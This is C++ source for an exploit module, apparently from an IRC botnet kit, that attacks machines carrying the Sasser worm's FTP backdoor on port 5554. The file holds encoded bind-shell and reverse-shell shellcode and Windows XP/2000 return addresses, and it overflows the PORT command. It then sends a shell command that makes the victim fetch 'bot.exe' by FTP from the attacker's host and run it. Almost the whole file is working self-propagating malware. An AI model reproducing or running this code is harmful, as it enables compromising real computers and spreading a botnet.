#include "main.h"
#include "mainctrl.h"
#include "utility.h"

class CScannerSASSER :
	public CScannerBase
{
/*
 -----------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------
 */
public:
	CScannerSASSER(void);
	virtual ~CScannerSASSER()
	throw()
	{
	}
	bool	Exploit(void);

};
#define SASSER_DEFAULT_PORT	5554

unsigned char bsh[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xDD,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0x36,
0xDB,0xDE,0xDE,0xDE,0xBC,0xB7,0xB0,0xBA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,
0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xB2,0xB7,0xAD,0xAA,0xBB,0xB0,0xDE,0x89,0x21,0xC8,
0x21,0x0E,0xB4,0xDE,0x8A,0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xBF,0xBD,0xBD,0xBB,0xAE,
0xAA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,0x87,0x55,0x22,
0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,
0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,
0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,
0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,
0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,
0xC8,0x21,0x0E
};

unsigned char rsh[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB6,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB6,0xA1,0xDE,0xDE,0xDF,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,
0x8E,0x8D,0x36,0xD6,0xDE,0xDE,0xDE,0xBD,0xB1,0xB0,0xB0,0xBB,0xBD,0xAA,0xDE,0x89,
0x21,0xC8,0x21,0x0E,0xB4,0xCE,0x87,0x55,0x22,0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,
0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,
0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,
0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,
0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,
0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,0xC8,0x21,0x0E
};

struct { char *os; long goreg; long gpa; long lla;}
targets[] = { 
//  { "os", pop pop ret, GetProcAd ptr, LoadLib ptr },
 { "wXP SP1 many", 0x77BEEB23, 0x77be10CC, 0x77be10D0 }, // msvcrt.dll's
 { "wXP SP1 most others", 0x77C1C0BD, 0x77C110CC, 0x77c110D0 },
 { "w2k SP4 many", 0x7801D081, 0x780320cc, 0x780320d0 },
}, tsz;

void setoff(long GPA, long LLA) {
int gpa=GPA^0xdededede, lla=LLA^0xdededede;
memcpy(bsh+0x1d,&gpa,4);
memcpy(bsh+0x2e,&lla,4);
memcpy(rsh+0x1d,&gpa,4);
memcpy(rsh+0x2e,&lla,4);
}

CScannerSASSER::CScannerSASSER(void)
{
	m_szType = "CScannerSASSER";
	m_sScannerName.Assign("SASSER");
}

bool CScannerSASSER::Exploit(void)
{
	char *szBuffer;
	int Port=5300;
	char *jmp[]={"\xeb\x06","\xe9\x13\xfc\xff\xff"};
	int type=0;

	Port=Port ^ 0xdede;
	Port=(Port & 0xff) << 8 | Port >>8;
	memcpy(bsh+0x57,&Port,2);
	memcpy(rsh+0x5a,&Port,2);
	Port=Port ^ 0xdede;
	Port=(Port & 0xff) << 8 | Port >>8;

	if(!m_sSocket.Connect(m_sSocket.m_szHost, SASSER_DEFAULT_PORT))	/* Connect failed, exit */
	{
		return false;
	}

	if(g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: Scanning %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	szBuffer=(char *)malloc(4096);
	memset(szBuffer,0,sizeof(szBuffer));
	sprintf(szBuffer,"USER x\n");
	if(!m_sSocket.Write(szBuffer, strlen(szBuffer))) { m_sSocket.Disconnect(); return false; }
	m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);
	sprintf(szBuffer,"PASS x\n");
	if(!m_sSocket.Write(szBuffer, strlen(szBuffer))) { m_sSocket.Disconnect(); return false; }
	m_sSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000);

	memset(szBuffer+0000,0x90,2000);
	strncpy(szBuffer,"PORT ",5);
	strcat(szBuffer,"\x0a");
	memcpy(szBuffer+272,jmp[0],2);
	memcpy(szBuffer+276,&targets[type].goreg,4);
	memcpy(szBuffer+280,jmp[1],5);
	setoff(targets[type].gpa, targets[type].lla);
	memcpy(szBuffer+300,&bsh,strlen((const char *)bsh));
	if(!m_sSocket.Write(szBuffer, strlen(szBuffer))) { m_sSocket.Disconnect(); return false; }

	Sleep(10000); CSocket outSocket;

	if(!outSocket.Connect(m_sSocket.m_szHost, 5300)) // Connect failed, exit
	{ m_sSocket.Disconnect(); return false; }

	char mkdir_buff[400]="";
	int iPort=g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue;

	sprintf(mkdir_buff,
		"echo open %s %d > bla.txt && "
		"echo user blah blah >> bla.txt && "
		"echo binary >> bla.txt && "
		"echo get %s >> bla.txt && "
		"echo quit >> bla.txt && "
		"ftp.exe -n -s:bla.txt && "
		"%s\n",
		g_pMainCtrl->m_cIRC.m_sLocalIp.CStr(), iPort, "bot.exe", "bot.exe");

	if(!outSocket.RecvTO(szBuffer, sizeof(szBuffer), 5000)) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	Sleep(500);

	if(!outSocket.Write((char*)mkdir_buff, sizeof(mkdir_buff))) {
		m_sSocket.Disconnect(); outSocket.Disconnect(); return false; }

	// successful!!!
	if (g_pMainCtrl->m_cBot.scaninfo_level.iValue >= 2)
	{
		SendLocal("%s: Exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
	}

	free(szBuffer);
	m_sSocket.Disconnect(); return true;
}

REGSCANNER(SASSER_5554, SASSER, 5554, true, false);